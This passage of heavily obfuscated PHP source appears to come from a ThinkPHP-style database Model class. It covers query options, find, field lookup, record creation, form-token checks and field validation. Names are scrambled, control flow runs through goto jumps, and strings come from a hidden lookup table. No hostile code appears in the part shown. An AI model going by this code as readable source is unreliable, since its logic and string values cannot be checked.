is_array($Eö«¿†Ô­×[$Eï›ÖŸ®£¯[272]]) && !empty($EßÒ¹îºã†) && !isset($Eö«¿†Ô­×[$Eï›ÖŸ®£¯[279]]) && !isset($Eö«¿†Ô­×[$Eï›ÖŸ®£¯[276]])) { foreach ($Eö«¿†Ô­×[$Eï›ÖŸ®£¯[272]] as $FŞ‹Øßêİ => $c¢¢İïÒœÍ) { $FŞ‹Øßêİ = trim($FŞ‹Øßêİ); if (in_array($FŞ‹Øßêİ, $EßÒ¹îºã†, !0)) { if (is_scalar($c¢¢İïÒœÍ)) { $this->_parseType($Eö«¿†Ô­×[$Eï›ÖŸ®£¯[272]], $FŞ‹Øßêİ); } } elseif (!is_numeric($FŞ‹Øßêİ) && $Eï›ÖŸ®£¯[80] != substr($FŞ‹Øßêİ, 0, 1) && !1 === strpos($FŞ‹Øßêİ, $Eï›ÖŸ®£¯[101]) && !1 === strpos($FŞ‹Øßêİ, $Eï›ÖŸ®£¯[257]) && !1 === strpos($FŞ‹Øßêİ, $Eï›ÖŸ®£¯[280]) && !1 === strpos($FŞ‹Øßêİ, $Eï›ÖŸ®£¯[281])) { unset($Eö«¿†Ô­×[$Eï›ÖŸ®£¯[272]][$FŞ‹Øßêİ]); } } } $this->_options_filter($Eö«¿†Ô­×); return $Eö«¿†Ô­×; goto F‰–Şˆ©Â¦; bîŠì†Í: if (!isset($Eö«¿†Ô­×[$Eï›ÖŸ®£¯[276]])) { $Eö«¿†Ô­×[$Eï›ÖŸ®£¯[276]] = $this->getTableName(); $EßÒ¹îºã† = $this->fields; } else { $EßÒ¹îºã† = $this->getDbFields(); } if (!empty($Eö«¿†Ô­×[$Eï›ÖŸ®£¯[277]])) { $Eö«¿†Ô­×[$Eï›ÖŸ®£¯[276]] .= $Eï›ÖŸ®£¯[50] . $Eö«¿†Ô­×[$Eï›ÖŸ®£¯[277]]; } $Eö«¿†Ô­×[$Eï›ÖŸ®£¯[278]] = $this->name; goto Bˆ¦™Á‹á’; DİÑ…õğŞ–: $Eï›ÖŸ®£¯ =& $_SERVER[¶ªÕß‚ØÁŸ]; if (is_array($Eö«¿†Ô­×)) { $Eö«¿†Ô­× = array_merge($this->options, $Eö«¿†Ô­×); } $this->options = array(); goto bîŠì†Í; F‰–Şˆ©Â¦: } protected function _options_filter(&$eù÷ËÙ±›) { } protected function _parseType(&$bª†Ú«‹¹, $A¿µøƒÈ½ß) { $bÄ¶µÊÅ±ã =& $_SERVER[¶ªÕß‚ØÁŸ]; if (empty($this->options[$bÄ¶µÊÅ±ã[282]][$bÄ¶µÊÅ±ã[4] . $A¿µøƒÈ½ß])) { $fÆÓÔéÛÆ† = strtolower($this->fields[$bÄ¶µÊÅ±ã[249]][$A¿µøƒÈ½ß]); if (!1 !== strpos($fÆÓÔéÛÆ†, $bÄ¶µÊÅ±ã[283])) { } elseif (!1 === strpos($fÆÓÔéÛÆ†, $bÄ¶µÊÅ±ã[284]) && !1 !== strpos($fÆÓÔéÛÆ†, $bÄ¶µÊÅ±ã[285])) { $bª†Ú«‹¹[$A¿µøƒÈ½ß] = intval($bª†Ú«‹¹[$A¿µøƒÈ½ß]); } elseif (!1 !== strpos($fÆÓÔéÛÆ†, $bÄ¶µÊÅ±ã[286]) || !1 !== strpos($fÆÓÔéÛÆ†, $bÄ¶µÊÅ±ã[287])) { $bª†Ú«‹¹[$A¿µøƒÈ½ß] = floatval($bª†Ú«‹¹[$A¿µøƒÈ½ß]); } elseif (!1 !== strpos($fÆÓÔéÛÆ†, $bÄ¶µÊÅ±ã[288])) { $bª†Ú«‹¹[$A¿µøƒÈ½ß] = (bool) $bª†Ú«‹¹[$A¿µøƒÈ½ß]; } } } public function find($AÕªÊÓÎğ = array()) { goto C‡‰†®Ú½; fÀÛ„Ëøó: $AÕªÊÓÎğ = $this->_parseOptions(); $C† ˜­Ëªİ = $this->db->select($AÕªÊÓÎğ); if (!1 === $C† ˜­Ëªİ) { return !1; } goto e¡à®°æñ‡; e¡à®°æñ‡: if (empty($C† ˜­Ëªİ)) { return null; } $this->data = $C† ˜­Ëªİ[0]; $this->_afterFind($this->data, $AÕªÊÓÎğ); goto eŸ¸¶Ü±…; C‡‰†®Ú½: $dê÷„ğÊîâ =& $_SERVER[¶ªÕß‚ØÁŸ]; if (is_numeric($AÕªÊÓÎğ) || is_string($AÕªÊÓÎğ)) { $d® ÔÖùÒë[$this->getPk()] = intval($AÕªÊÓÎğ); $this->options[$dê÷„ğÊîâ[272]] = $d® ÔÖùÒë; } $this->options[$dê÷„ğÊîâ[289]] = 1; goto fÀÛ„Ëøó; eŸ¸¶Ü±…: if (!empty($this->options[$dê÷„ğÊîâ[290]])) { return $this->returnResult($this->data, $this->options[$dê÷„ğÊîâ[290]]); } return $this->data; goto DíÆ—²ˆ¶; DíÆ—²ˆ¶: } protected function _afterFind(&$aò—µøŞŠä, $e§•Á¯Ê¾Ï) { } protected function returnResult($eÊ¡óÊãÊ, $E§ª¹íÜ¦ = '') { $aåÖ©•«„ø =& $_SERVER[¶ªÕß‚ØÁŸ]; if ($E§ª¹íÜ¦) { if (is_callable($E§ª¹íÜ¦)) { return call_user_func($E§ª¹íÜ¦, $eÊ¡óÊãÊ); } switch (strtolower($E§ª¹íÜ¦)) { case $aåÖ©•«„ø[291]: return json_encode($eÊ¡óÊãÊ); case $aåÖ©•«„ø[292]: return xml_encode($eÊ¡óÊãÊ); } } return $eÊ¡óÊãÊ; } public function parseFieldsMap($fÏ²ùñ„Ãí, $A×ÜŸÑõ“› = 1) { if (!empty($this->_map)) { foreach ($this->_map as $F‘­Óéìš => $eè¢™Ïã¾) { if ($A×ÜŸÑõ“› == 1) { if (isset($fÏ²ùñ„Ãí[$eè¢™Ïã¾])) { $fÏ²ùñ„Ãí[$F‘­Óéìš] = $fÏ²ùñ„Ãí[$eè¢™Ïã¾]; unset($fÏ²ùñ„Ãí[$eè¢™Ïã¾]); } } else { if (isset($fÏ²ùñ„Ãí[$F‘­Óéìš])) { $fÏ²ùñ„Ãí[$eè¢™Ïã¾] = $fÏ²ùñ„Ãí[$F‘­Óéìš]; unset($fÏ²ùñ„Ãí[$F‘­Óéìš]); } } } } return $fÏ²ùñ„Ãí; } public function setField($E†Ú“âœÜ¸, $EÓœ·Î Ö“ = '') { if (is_array($E†Ú“âœÜ¸)) { $Eßš¯¡…ä‹ = $E†Ú“âœÜ¸; } else { $Eßš¯¡…ä‹[$E†Ú“âœÜ¸] = $EÓœ·Î Ö“; } return $this->save($Eßš¯¡…ä‹); } public function setAdd($FÖ†œ˜ â, $F©Õ§ô´³¸ = 1) { $Eë³Ò¬ŒŒ =& $_SERVER[¶ªÕß‚ØÁŸ]; $e’•Ñ‰ä÷‹ = $FÖ†œ˜ â . $Eë³Ò¬ŒŒ[293] . $F©Õ§ô´³¸; if ($F©Õ§ô´³¸ < 0) { $e’•Ñ‰ä÷‹ = $FÖ†œ˜ â . $F©Õ§ô´³¸; } return $this->setField($FÖ†œ˜ â, array($Eë³Ò¬ŒŒ[294], $e’•Ñ‰ä÷‹)); } public function getField($AãñÅ½¨‹™, $DÖ²ŠâÈ‡Ø = null) { $Få»Ö¤«ÈÄ =& $_SERVER[¶ªÕß‚ØÁŸ]; $D³Ù‰æ¦ÛŒ[$Få»Ö¤«ÈÄ[270]] = $AãñÅ½¨‹™; $D³Ù‰æ¦ÛŒ = $this->_parseOptions($D³Ù‰æ¦ÛŒ); $AãñÅ½¨‹™ = trim($AãñÅ½¨‹™); if (strpos($AãñÅ½¨‹™, $Få»Ö¤«ÈÄ[47])) { if (!isset($D³Ù‰æ¦ÛŒ[$Få»Ö¤«ÈÄ[289]])) { $D³Ù‰æ¦ÛŒ[$Få»Ö¤«ÈÄ[289]] = is_numeric($DÖ²ŠâÈ‡Ø) ? $DÖ²ŠâÈ‡Ø : $Få»Ö¤«ÈÄ[33]; } $eˆ÷ÕŠ¹ç = $this->db->select($D³Ù‰æ¦ÛŒ); if (!empty($eˆ÷ÕŠ¹ç)) { goto EÇÁ‘×·Ö; EÇÁ‘×·Ö: $d¾œÁùª˜÷ = explode($Få»Ö¤«ÈÄ[47], $AãñÅ½¨‹™); $AãñÅ½¨‹™ = array_keys($eˆ÷ÕŠ¹ç[0]); $f×¯Òšâ—§ = array_shift($AãñÅ½¨‹™); goto FİĞ•ÎÓ‡Æ; dçÊ ‡ÇÑ: foreach ($eˆ÷ÕŠ¹ç as $eÑš„ÙÌ‚Ê) { $EÓ‰¼ÍšÀ = $eÑš„ÙÌ‚Ê[$f×¯Òšâ—§]; if (2 == $cò©¹—·) { $c†›Äœø£×[$EÓ‰¼ÍšÀ] = $eÑš„ÙÌ‚Ê[$FË¸“£ğíĞ]; } else { $c†›Äœø£×[$EÓ‰¼ÍšÀ] = is_string($DÖ²ŠâÈ‡Ø) ? implode($DÖ²ŠâÈ‡Ø, $eÑš„ÙÌ‚Ê) : $eÑš„ÙÌ‚Ê; } } return $c†›Äœø£×; goto CÙæËà¹ì½; FİĞ•ÎÓ‡Æ: $FË¸“£ğíĞ = array_shift($AãñÅ½¨‹™); $c†›Äœø£× = array(); $cò©¹—· = count($d¾œÁùª˜÷); goto dçÊ ‡ÇÑ; CÙæËà¹ì½: } } else { if (!0 !== $DÖ²ŠâÈ‡Ø) { $D³Ù‰æ¦ÛŒ[$Få»Ö¤«ÈÄ[289]] = is_numeric($DÖ²ŠâÈ‡Ø) ? $DÖ²ŠâÈ‡Ø : 1; } if ($DÖ²ŠâÈ‡Ø === $Få»Ö¤«ÈÄ[252]) { unset($D³Ù‰æ¦ÛŒ[$Få»Ö¤«ÈÄ[289]]); } $eÑš„ÙÌ‚Ê = $this->db->select($D³Ù‰æ¦ÛŒ); if (!empty($eÑš„ÙÌ‚Ê)) { if ($DÖ²ŠâÈ‡Ø === $Få»Ö¤«ÈÄ[252]) { return reset($eÑš„ÙÌ‚Ê[0]); } if (!0 !== $DÖ²ŠâÈ‡Ø && 1 == $D³Ù‰æ¦ÛŒ[$Få»Ö¤«ÈÄ[289]]) { return reset($eÑš„ÙÌ‚Ê[0]); } foreach ($eÑš„ÙÌ‚Ê as $d¸®éÎ¥¦) { $F¿ç„ŸƒÒ[] = $d¸®éÎ¥¦[$AãñÅ½¨‹™]; } return $F¿ç„ŸƒÒ; } } return null; } public function create($e¦•Ñùíİß = '', $Dƒ·ÙÁ ¸Í = '') { goto A¡è®©¿œ‰; AÔ¥¾Œˆ²¤: if ($this->autoCheckFields) { $cç‚¤àŒ¡ = $this->getDbFields(); foreach ($e¦•Ñùíİß as $cœåÌ•Š => $eÖÕ‰²‹•) { if (!in_array($cœåÌ•Š, $cç‚¤àŒ¡)) { unset($e¦•Ñùíİß[$cœåÌ•Š]); } elseif (MAGIC_QUOTES_GPC && is_string($eÖÕ‰²‹•)) { $e¦•Ñùíİß[$cœåÌ•Š] = stripslashes($eÖÕ‰²‹•); } } } $this->autoOperation($e¦•Ñùíİß, $Dƒ·ÙÁ ¸Í); $this->data = $e¦•Ñùíİß; goto DÆ˜Æ¬ƒİè; DÆ˜Æ¬ƒİè: return $e¦•Ñùíİß; goto EØˆÅ¬Õ·Ó; F¤ÜŒ’ƒéÅ: $e¦•Ñùíİß = $this->parseFieldsMap($e¦•Ñùíİß, 0); $Dƒ·ÙÁ ¸Í = $Dƒ·ÙÁ ¸Í ? $Dƒ·ÙÁ ¸Í : (!empty($e¦•Ñùíİß[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$bÑ«¹¹ì‘š[270]])) { $cç‚¤àŒ¡ = $this->options[$bÑ«¹¹ì‘š[270]]; unset($this->options[$bÑ«¹¹ì‘š[270]]); } elseif ($Dƒ·ÙÁ ¸Í == THINK_MODEL_INSERT && isset($this->insertFields)) { $cç‚¤àŒ¡ = $this->insertFields; } elseif ($Dƒ·ÙÁ ¸Í == THINK_MODEL_UPDATE && isset($this->updateFields)) { $cç‚¤àŒ¡ = $this->updateFields; } goto d£ä†¯…¶á; A¡è®©¿œ‰: $bÑ«¹¹ì‘š =& $_SERVER[¶ªÕß‚ØÁŸ]; if (empty($e¦•Ñùíİß)) { $e¦•Ñùíİß = $_POST; } elseif (is_object($e¦•Ñùíİß)) { $e¦•Ñùíİß = get_object_vars($e¦•Ñùíİß); } if (empty($e¦•Ñùíİß) || !is_array($e¦•Ñùíİß)) { $this->error = think_lang($bÑ«¹¹ì‘š[268]); return !1; } goto F¤ÜŒ’ƒéÅ; d£ä†¯…¶á: if (isset($cç‚¤àŒ¡)) { if (is_string($cç‚¤àŒ¡)) { $cç‚¤àŒ¡ = explode($bÑ«¹¹ì‘š[47], $cç‚¤àŒ¡); } if (think_config($bÑ«¹¹ì‘š[295])) { $cç‚¤àŒ¡[] = think_config($bÑ«¹¹ì‘š[296]); } foreach ($e¦•Ñùíİß as $cœåÌ•Š => $eÖÕ‰²‹•) { if (!in_array($cœåÌ•Š, $cç‚¤àŒ¡)) { unset($e¦•Ñùíİß[$cœåÌ•Š]); } } } if (!$this->autoValidation($e¦•Ñùíİß, $Dƒ·ÙÁ ¸Í)) { return !1; } if (!$this->autoCheckToken($e¦•Ñùíİß)) { $this->error = think_lang($bÑ«¹¹ì‘š[297]); return !1; } goto AÔ¥¾Œˆ²¤; EØˆÅ¬Õ·Ó: } public function autoCheckToken($A›Ş¹ƒƒá¡) { $aÕìê‡ÇÑË =& $_SERVER[¶ªÕß‚ØÁŸ]; if (isset($this->options[$aÕìê‡ÇÑË[298]]) && !$this->options[$aÕìê‡ÇÑË[298]]) { return !0; } if (think_config($aÕìê‡ÇÑË[295])) { $AÜï”»ŸºÈ = think_config($aÕìê‡ÇÑË[296]); if (!isset($A›Ş¹ƒƒá¡[$AÜï”»ŸºÈ]) || Session::get($AÜï”»ŸºÈ)) { return !1; } list($dÔÎªô²š, $Cê¼¥˜Óñ¯) = explode($aÕìê‡ÇÑË[80], $A›Ş¹ƒƒá¡[$AÜï”»ŸºÈ]); if ($Cê¼¥˜Óñ¯ && Session::get($AÜï”»ŸºÈ . $aÕìê‡ÇÑË[101] . $dÔÎªô²š) === $Cê¼¥˜Óñ¯) { Session::remove($AÜï”»ŸºÈ . $aÕìê‡ÇÑË[101] . $dÔÎªô²š); return !0; } if (think_config($aÕìê‡ÇÑË[299])) { Session::remove($AÜï”»ŸºÈ . $aÕìê‡ÇÑË[101] . $dÔÎªô²š); } return !1; } return !0; } public function regex($b˜Ëì´™—š, $AÈÜŒ¾Óˆ) { $c„†à›Úô’ =& $_SERVER[¶ªÕß‚ØÁŸ]; $f¦‹ÈÛø”Ü = array($c„†à›Úô’[300] => $c„†à›Úô’[301], $c„†à›Úô’[302] => $c„†à›Úô’[303], $c„†à›Úô’[304] => $c„†à›Úô’[305], $c„†à›Úô’[306] => $c„†à›Úô’[307], $c„†à›Úô’[308] => $c„†à›Úô’[309], $c„†à›Úô’[310] => $c„†à›Úô’[311], $c„†à›Úô’[312] => $c„†à›Úô’[313], $c„†à›Úô’[287] => $c„†à›Úô’[314], $c„†à›Úô’[315] => $c„†à›Úô’[316]); if (isset($f¦‹ÈÛø”Ü[strtolower($AÈÜŒ¾Óˆ)])) { $AÈÜŒ¾Óˆ = $f¦‹ÈÛø”Ü[strtolower($AÈÜŒ¾Óˆ)]; } return preg_match($AÈÜŒ¾Óˆ, $b˜Ëì´™—š) === 1; } private function autoOperation(&$b®ôßÉ‹Ù, $bğ®á»ËÖ) { $aÆºÊ½‡öè =& $_SERVER[¶ªÕß‚ØÁŸ]; if (!empty($this->options[$aÆºÊ½‡öè[317]])) { $CİŸ»ô¼à“ = $this->options[$aÆºÊ½‡öè[317]]; unset($this->options[$aÆºÊ½‡öè[317]]); } elseif (!empty($this->_auto)) { $CİŸ»ô¼à“ = $this->_auto; } if (isset($CİŸ»ô¼à“)) { foreach ($CİŸ»ô¼à“ as $cÁˆªÂÀÇŒ) { if (empty($cÁˆªÂÀÇŒ[2])) { $cÁˆªÂÀÇŒ[2] = THINK_MODEL_INSERT; } if ($bğ®á»ËÖ == $cÁˆªÂÀÇŒ[2] || $cÁˆªÂÀÇŒ[2] == THINK_MODEL_BOTH) { switch (trim($cÁˆªÂÀÇŒ[3])) { case $aÆºÊ½‡öè[318]: case $aÆºÊ½‡öè[319]: $Aº÷„ğò‰ = isset($cÁˆªÂÀÇŒ[4]) ? (array) $cÁˆªÂÀÇŒ[4] : array(); if (isset($b®ôßÉ‹Ù[$cÁˆªÂÀÇŒ[0]])) { array_unshift($Aº÷„ğò‰, $b®ôßÉ‹Ù[$cÁˆªÂÀÇŒ[0]]); } if ($aÆºÊ½‡öè[318] == $cÁˆªÂÀÇŒ[3]) { $b®ôßÉ‹Ù[$cÁˆªÂÀÇŒ[0]] = call_user_func_array($cÁˆªÂÀÇŒ[1], $Aº÷„ğò‰); } else { $b®ôßÉ‹Ù[$cÁˆªÂÀÇŒ[0]] = call_user_func_array(array(&$this, $cÁˆªÂÀÇŒ[1]), $Aº÷„ğò‰); } break; case $aÆºÊ½‡öè[270]: $b®ôßÉ‹Ù[$cÁˆªÂÀÇŒ[0]] = $b®ôßÉ‹Ù[$cÁˆªÂÀÇŒ[1]]; break; case $aÆºÊ½‡öè[320]: if ($aÆºÊ½‡öè[33] === $b®ôßÉ‹Ù[$cÁˆªÂÀÇŒ[0]]) { unset($b®ôßÉ‹Ù[$cÁˆªÂÀÇŒ[0]]); } break; case $aÆºÊ½‡öè[321]: default: $b®ôßÉ‹Ù[$cÁˆªÂÀÇŒ[0]] = $cÁˆªÂÀÇŒ[1]; } if (!1 === $b®ôßÉ‹Ù[$cÁˆªÂÀÇŒ[0]]) { unset($b®ôßÉ‹Ù[$cÁˆªÂÀÇŒ[0]]); } } } } return $b®ôßÉ‹Ù; } protected function autoValidation($B¿¦œ“Ûî, $c¡‚¥ªªó) { $c•çÚ¬óš =& $_SERVER[¶ªÕß‚ØÁŸ]; if (!empty($this->options[$c•çÚ¬óš[322]])) { $B‡ß“³è¶Ç = $this->options[$c•çÚ¬óš[322]]; unset($this->options[$c•çÚ¬óš[322]]); } elseif (!empty($this->_validate)) { $B‡ß“³è¶Ç = $this->_validate; } if (isset($B‡ß“³è¶Ç)) { if ($this->patchValidate) { $this->error = array(); } foreach ($B‡ß“³è¶Ç as $dàÜÎ“ôÛ§ => $f¨«‚ÙÊÓç) { if (empty($f¨«‚ÙÊÓç[5]) || $f¨«‚ÙÊÓç[5] == THINK_MODEL_BOTH || $f¨«‚ÙÊÓç[5] == $c¡‚¥ªªó) { if (0 == strpos($f¨«‚ÙÊÓç[2], $c•çÚ¬óš[323]) && strpos($f¨«‚ÙÊÓç[2], $c•çÚ¬óš[324])) { $f¨«‚ÙÊÓç[2] = think_lang(substr($f¨«‚ÙÊÓç[2], 2, -1)); } $f¨«‚ÙÊÓç[3] = isset($f¨«‚ÙÊÓç[3]) ? $f¨«‚ÙÊÓç[3] : THINK_EXISTS_VALIDATE; $f¨«‚ÙÊÓç[4] = isset($f¨«‚ÙÊÓç[4]) ? $f¨«‚ÙÊÓç[4] : $c•çÚ¬óš[325]; switch ($f¨«‚ÙÊÓç[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($B¿¦œ“Ûî, $f¨«‚ÙÊÓç)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($c•çÚ¬óš[33] != trim($B¿¦œ“Ûî[$f¨«‚ÙÊÓç[0]])) { if (!1 === $this->_validationField($B¿¦œ“Ûî, $f¨«‚ÙÊÓç)) { return !1; } } break; default: if (isset($B¿¦œ“Ûî[$f¨«‚ÙÊÓç[0]])) { if (!1 === $this->_validationField($B¿¦œ“Ûî, $f¨«‚ÙÊÓç)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($BİË¬œÔò‡, $e¬ÈïĞè±Ë) { if (!1 === $this->_validationFieldItem($BİË¬œÔò‡, $e¬ÈïĞè±Ë)) { if ($this->patchValidate) { $this->error[$e¬ÈïĞè±Ë[0]] = $e¬ÈïĞè±Ë[2]; } else { $this->error = $e¬ÈïĞè±Ë[2]; return !1; } } return; } protected function _validationFieldItem($cÛ‡ÎÇÀ, $DÑ¸íÛÚ„«) { $dˆÌô‚¬’º =& $_SERVER[¶ªÕß‚ØÁŸ]; switch (strtolower(trim($DÑ¸íÛÚ„«[4]))) { case $dˆÌô‚¬’º[318]: case $dˆÌô‚¬’º[319]: $bÓòºª”®¬ = isset($DÑ¸íÛÚ„«[6]) ? (array) $DÑ¸íÛÚ„«[6] : array(); if (is_string($DÑ¸íÛÚ„«[0]) && strpos($DÑ¸íÛÚ„«[0], $dˆÌô‚¬’º[47])) { $DÑ¸íÛÚ„«[0] = explode($dˆÌô‚¬’º[47], $DÑ¸íÛÚ„«[0]); } if (is_array($DÑ¸íÛÚ„«[0])) { foreach ($DÑ¸íÛÚ„«[0] as $A¤¹…¶§) { $aªˆ¨ŠãŒ[$A¤¹…¶§] = $cÛ‡ÎÇÀ[$A¤¹…¶§]; } array_unshift($bÓòºª”®¬, $aªˆ¨ŠãŒ); } else { array_unshift($bÓòºª”®¬, $cÛ‡ÎÇÀ[$DÑ¸íÛÚ„«[0]]); } if ($dˆÌô‚¬’º[318] == $DÑ¸íÛÚ„«[4]) { return call_user_func_array($DÑ¸íÛÚ„«[1], $bÓòºª”®¬); } else { return call_user_func_array(array(&$this, $DÑ¸íÛÚ„«[1]), $bÓòºª”®¬); } case $dˆÌô‚¬’º[326]: return $cÛ‡ÎÇÀ[$DÑ¸íÛÚ„«[0]] == $cÛ‡ÎÇÀ[$DÑ¸íÛÚ„«[1]]; case $dˆÌô‚¬’º[327]: if (is_string($DÑ¸íÛÚ„«[0]) && strpos($DÑ¸íÛÚ„«[0], $dˆÌô‚¬’º[47])) { $DÑ¸íÛÚ„«[0] = explode($dˆÌô‚¬’º[47], $DÑ¸íÛÚ„«[0]); } $d×­Š×¬ğ = array(); if (is_array($DÑ¸íÛÚ„«[0])) { foreach ($DÑ¸íÛÚ„«[0] as $A¤¹…¶§) { $d×­Š×¬ğ[$A¤¹…¶§] = $cÛ‡ÎÇÀ[$A¤¹…¶§]; } } else { $d×­Š×¬ğ[$DÑ¸íÛÚ„«[0]] = $cÛ‡ÎÇÀ[$DÑ¸íÛÚ„«[0]]; } if (!empty($cÛ‡ÎÇÀ[$this->getPk()])) { $d×­Š×¬ğ[$this->getPk()] = array($dˆÌô‚¬’º[328], $cÛ‡ÎÇÀ[$this->getPk()]); } if ($this->where($d×­Š×¬ğ)->find()) { return !1; } return !0; default: return $this->check($cÛ‡ÎÇÀ[$DÑ¸íÛÚ„«[0]], $DÑ¸íÛÚ„«[1], $DÑ¸íÛÚ„«[4]); } } public function check($d°ÉÛä‰ÃÉ, $b´ÆÀæéØ¤, $C¸¦ËòÓ¼æ = "\x72\145\x67\x65\170") { $b”³Õ§¶“ =& $_SERVER[¶ªÕß‚ØÁŸ]; $C¸¦ËòÓ¼æ = strtolower(trim($C¸¦ËòÓ¼æ)); switch ($C¸¦ËòÓ¼æ) { case $b”³Õ§¶“[7]: case $b”³Õ§¶“[329]: $D–‘ÊÕ¼è¿ = is_array($b´ÆÀæéØ¤) ? $b´ÆÀæéØ¤ : explode($b”³Õ§¶“[47], $b´ÆÀæéØ¤); return $C¸¦ËòÓ¼æ == $b”³Õ§¶“[7] ? in_array($d°ÉÛä‰ÃÉ, $D–‘ÊÕ¼è¿) : !in_array($d°ÉÛä‰ÃÉ, $D–‘ÊÕ¼è¿); case $b”³Õ§¶“[330]: case $b”³Õ§¶“[331]: if (is_array($b´ÆÀæéØ¤)) { $AæÈÀ•Öœ­ = $b´ÆÀæéØ¤[0]; $e…àõ‚›¤ = $b´ÆÀæéØ¤[1]; } else { list($AæÈÀ•Öœ­, $e…àõ‚›¤) = explode($b”³Õ§¶“[47], $b´ÆÀæéØ¤); } return $C¸¦ËòÓ¼æ == $b”³Õ§¶“[330] ? $d°ÉÛä‰ÃÉ >= $AæÈÀ•Öœ­ && $d°ÉÛä‰ÃÉ <= $e…àõ‚›¤ : $d°ÉÛä‰ÃÉ < $AæÈÀ•Öœ­ || $d°ÉÛä‰ÃÉ > $e…àõ‚›¤; case $b”³Õ§¶“[332]: case $b”³Õ§¶“[333]: return $C¸¦ËòÓ¼æ == $b”³Õ§¶“[332] ? $d°ÉÛä‰ÃÉ == $b´ÆÀæéØ¤ : $d°ÉÛä‰ÃÉ != $b´ÆÀæéØ¤; case $b”³Õ§¶“[334]: $b¸ƒœ«Äö¦ = mb_strlen($d°ÉÛä‰ÃÉ, $b”³Õ§¶“[335]); if (strpos($b´ÆÀæéØ¤, $b”³Õ§¶“[47])) { list($AæÈÀ•Öœ­, $e…àõ‚›¤) = explode($b”³Õ§¶“[47], $b´ÆÀæéØ¤); return $b¸ƒœ«Äö¦ >= $AæÈÀ•Öœ­ && $b¸ƒœ«Äö¦ <= $e…àõ‚›¤; } else { return $b¸ƒœ«Äö¦ == $b´ÆÀæéØ¤; } case $b”³Õ§¶“[336]: list($f‚¶òôëÑÓ, $aí¨ÔŠŒÁ) = explode($b”³Õ§¶“[47], $b´ÆÀæéØ¤); if (!is_numeric($f‚¶òôëÑÓ)) { $f‚¶òôëÑÓ = strtotime($f‚¶òôëÑÓ); } if (!is_numeric($aí¨ÔŠŒÁ)) { $aí¨ÔŠŒÁ = strtotime($aí¨ÔŠŒÁ); } return NOW_TIME >= $f‚¶òôëÑÓ && NOW_TIME <= $aí¨ÔŠŒÁ; case $b”³Õ§¶“[337]: return in_array(get_client_ip(), explode($b”³Õ§¶“[47], $b´ÆÀæéØ¤)); case $b”³Õ§¶“[338]: return !in_array(get_client_ip(), explode($b”³Õ§¶“[47], $b´ÆÀæéØ¤)); case $b”³Õ§¶“[325]: default: return $this->regex($d°ÉÛä‰ÃÉ, $b´ÆÀæéØ¤); } } public function query($A°áÒÎŸÜ, $a õ×Ãâš = false) { $DĞª­ÃÙÁØ =& $_SERVER[¶ªÕß‚ØÁŸ]; if (!is_bool($a õ×Ãâš) && !is_array($a õ×Ãâš)) { $a õ×Ãâš = func_get_args(); array_shift($a õ×Ãâš); } $A°áÒÎŸÜ = str_replace(array($DĞª­ÃÙÁØ[62], $DĞª­ÃÙÁØ[339]), $DĞª­ÃÙÁØ[50], $A°áÒÎŸÜ); $A°áÒÎŸÜ = $this->parseSql($A°áÒÎŸÜ, $a õ×Ãâš); return $this->db->query($A°áÒÎŸÜ); } public function execute($F“‘ËŸ‡‹, $e©ï§Ã©ˆ = false) { if (!is_bool($e©ï§Ã©ˆ) && !is_array($e©ï§Ã©ˆ)) { $e©ï§Ã©ˆ = func_get_args(); array_shift($e©ï§Ã©ˆ); } $F“‘ËŸ‡‹ = $this->parseSql($F“‘ËŸ‡‹, $e©ï§Ã©ˆ); return $this->db->execute($F“‘ËŸ‡‹); } protected function parseSql($c È…òµ…â, $f‡¡ìäæ°æ) { $eƒ”­áÜ­® =& $_SERVER[¶ªÕß‚ØÁŸ]; if (!0 === $f‡¡ìäæ°æ) { $dÖŸ¿‘ØŸà = $this->_parseOptions(); $c È…òµ…â = $this->db->parseSql($c È…òµ…â, $dÖŸ¿‘ØŸà); } elseif (is_array($f‡¡ìäæ°æ)) { $f‡¡ìäæ°æ = array_map(array($this->db, $eƒ”­áÜ­®[340]), $f‡¡ìäæ°æ); $c È…òµ…â = vsprintf($c È…òµ…â, $f‡¡ìäæ°æ); } else { $c È…òµ…â = strtr($c È…òµ…â, array($eƒ”­áÜ­®[341] => $this->getTableName(), $eƒ”­áÜ­®[342] => think_config($eƒ”­áÜ­®[241]))); } $this->db->setModel($this->name); return $c È…òµ…â; } public function db($e»ôÜâ…¥” = '', $fÂ˜÷é„º = '', $cßéÎ¼Î´ = array()) { goto f•¥åçˆÏ; f•¥åçˆÏ: $B“Ä¶±¬¡® =& $_SERVER[¶ªÕß‚ØÁŸ]; if ($B“Ä¶±¬¡®[33] === $e»ôÜâ…¥” && $this->db) { return $this->db; } static $F½ó„¶ÔÚ = array(); goto FÙ¿¹®á›Ó; FÙ¿¹®á›Ó: static $A§ŒÂéùÎÑ = array(); if (!isset($A§ŒÂéùÎÑ[$e»ôÜâ…¥”]) || isset($A§ŒÂéùÎÑ[$e»ôÜâ…¥”]) && $fÂ˜÷é„º && $F½ó„¶ÔÚ[$e»ôÜâ…¥”] != $fÂ˜÷é„º) { if (!empty($fÂ˜÷é„º) && is_string($fÂ˜÷é„º) && !1 === strpos($fÂ˜÷é„º, $B“Ä¶±¬¡®[8])) { $fÂ˜÷é„º = think_config($fÂ˜÷é„º); } $A§ŒÂéùÎÑ[$e»ôÜâ…¥”] = Db::getInstance($fÂ˜÷é„º); } elseif (NULL === $fÂ˜÷é„º) { $A§ŒÂéùÎÑ[$e»ôÜâ…¥”]->close(); unset($A§ŒÂéùÎÑ[$e»ôÜâ…¥”]); return; } if (!empty($cßéÎ¼Î´)) { if (is_string($cßéÎ¼Î´)) { parse_str($cßéÎ¼Î´, $cßéÎ¼Î´); } foreach ($cßéÎ¼Î´ as $f¤¾‡×Ã¢Û => $døŒÓ·¥›Ó) { $this->setProperty($f¤¾‡×Ã¢Û, $døŒÓ·¥›Ó); } } goto dĞÍÂôÖ; dĞÍÂôÖ: $F½ó„¶ÔÚ[$e»ôÜâ…¥”] = $fÂ˜÷é„º; $this->db = $A§ŒÂéùÎÑ[$e»ôÜâ…¥”]; $this->_after_db(); goto E±†Ô©Ûƒ½; E±†Ô©Ûƒ½: if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; goto bÍƒ×Ê‹Û¶; bÍƒ×Ê‹Û¶: } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $cÁÔÀšªÅ = get_class($this); if 